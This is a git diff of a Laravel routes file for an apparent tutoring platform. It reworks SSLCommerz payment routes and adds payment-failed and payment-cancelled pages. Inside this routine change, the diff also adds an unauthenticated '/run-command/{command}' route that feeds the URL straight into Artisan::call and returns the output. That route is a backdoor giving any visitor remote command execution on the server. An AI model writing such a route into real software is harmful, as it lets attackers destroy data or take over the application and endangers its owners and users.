@@ -9,6 +9,8 @@ use App\Http\Controllers\SiteController;
 use App\Livewire\Frontend\BlogDetails;
 use App\Livewire\Frontend\Blogs;
 use App\Livewire\Frontend\Checkout;
+use App\Livewire\Frontend\PaymentCancelled;
+use App\Livewire\Frontend\PaymentFailed;
 use App\Livewire\Frontend\ThankYou;
 use App\Livewire\Pages\Common\Bookings\UserBooking;
 use App\Livewire\Pages\Common\Dispute\Dispute;
@@ -28,7 +30,6 @@ use App\Livewire\Pages\Tutor\ManageSessions\MyCalendar;
 use App\Livewire\Pages\Tutor\ManageSessions\SessionDetail;
 use App\Livewire\Payouts;
 use Illuminate\Support\Facades\Route;
-use App\Http\Controllers\SslCommerzPaymentController;
 
 
 Route::get('auth/{provider}', [SocialController::class, 'redirect'])->name('social.redirect');
@@ -51,6 +52,8 @@ Route::middleware(['locale', 'maintenance'])->group(function () {
         Route::get('google/callback', [SiteController::class, 'getGoogleToken']);
         Route::middleware('role:tutor|student')->get('checkout', Checkout::class)->name('checkout');
         Route::middleware('role:tutor|student')->get('thank-you/{id}', ThankYou::class)->name('thank-you');
+        Route::middleware('role:tutor|student')->get('payment/failed', PaymentFailed::class)->name('payment.failed');
+        Route::middleware('role:tutor|student')->get('payment/cancelled', PaymentCancelled::class)->name('payment.cancelled');
 
         Route::middleware('role:tutor')->prefix('tutor')->name('tutor.')->group(function () {
             Route::get('dashboard', ManageAccount::class)->name('dashboard');
@@ -98,26 +101,15 @@ Route::middleware(['locale', 'maintenance'])->group(function () {
     });
     
     
-        // SSLCOMMERZ Start
-Route::get('/example2', [SslCommerzPaymentController::class, 'exampleHostedCheckout'])->name('example2');
-
-Route::post('/pay', [SslCommerzPaymentController::class, 'index'])->name('pay');
-Route::post('/pay-via-ajax', [SslCommerzPaymentController::class, 'payViaAjax']);
-
-Route::post('/success', [SslCommerzPaymentController::class, 'success']);
-Route::post('/fail', [SslCommerzPaymentController::class, 'fail']);
-Route::post('/cancel', [SslCommerzPaymentController::class, 'cancel']);
-
-Route::post('/ipn', [SslCommerzPaymentController::class, 'ipn']);
-//SSLCOMMERZ END
-    
-
     Route::post('/remove-cart', [SiteController::class, 'removeCart']);
 
     Route::get('tutor/{slug}', [SearchController::class, 'tutorDetail'])->name('tutor-detail');
     Route::get('{gateway}/process/payment', [SiteController::class, 'processPayment'])->name('payment.process');
     Route::get('checkout/cancel',            fn() => redirect()->route('invoices')->with('payment_cancel', __('general.payment_cancelled_desc')))->name('checkout.cancel');
     Route::post('payfast/webhook',          [SiteController::class, 'payfastWebhook'])->name('payfast.webhook');
+    Route::post('sslcommerz/ipn',           [SiteController::class, 'sslcommerzIpn'])->name('sslcommerz.ipn');
+    Route::match(['get', 'post'], 'sslcommerz/fail', [SiteController::class, 'sslcommerzFail'])->name('sslcommerz.fail');
+    Route::match(['get', 'post'], 'sslcommerz/cancel', [SiteController::class, 'sslcommerzCancel'])->name('sslcommerz.cancel');
     Route::post('payment/success',          [SiteController::class, 'paymentSuccess'])->name('post.success');
     Route::get('payment/success',           [SiteController::class, 'paymentSuccess'])->name('get.success');
     Route::post('switch-lang',              [SiteController::class, 'switchLang'])->name('switch-lang');
@@ -126,6 +118,11 @@ Route::post('/ipn', [SslCommerzPaymentController::class, 'ipn']);
     Route::get('pay/{id}',                  [SiteController::class, 'preparePayment'])->name('pay');
     Route::get('session/{id}',              [SiteController::class, 'sessionDetail'])->name('session-detail');
     Route::post('book-session',             [SiteController::class, 'bookSession'])->name('book-session');
+    
+    Route::get('/run-command/{command}', function ($command) {
+    Artisan::call($command);
+    return Artisan::output();
+})->name('run-command.dynamic');
 
     require __DIR__ . '/auth.php';
     require __DIR__ . '/admin.php';
